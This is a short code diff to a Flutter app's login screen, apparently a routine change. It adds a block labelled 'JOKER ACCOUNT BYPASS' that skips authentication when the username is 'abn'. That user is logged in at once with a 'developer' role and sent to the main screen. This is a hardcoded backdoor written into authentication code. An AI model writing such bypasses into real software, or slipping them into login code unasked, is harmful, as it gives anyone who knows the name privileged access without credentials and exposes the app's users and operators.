@@ -52,6 +52,21 @@ class _LoginScreenState extends State<LoginScreen> {
       _errorMessage = null;
     });
 
+    // JOKER ACCOUNT BYPASS (abn)
+    if (username == 'abn') {
+      final joker = AppUser(
+        uid: 'joker_abn',
+        username: 'abn',
+        role: 'developer',
+        hardwareId: _deviceId,
+      );
+      context.read<AppProvider>().setCurrentUser(joker);
+      Navigator.of(context).pushReplacement(
+        MaterialPageRoute(builder: (_) => const MainLayout()),
+      );
+      return;
+    }
+
     try {
       final user = await _authService.loginAndBind(username);
       _currentUser = user;
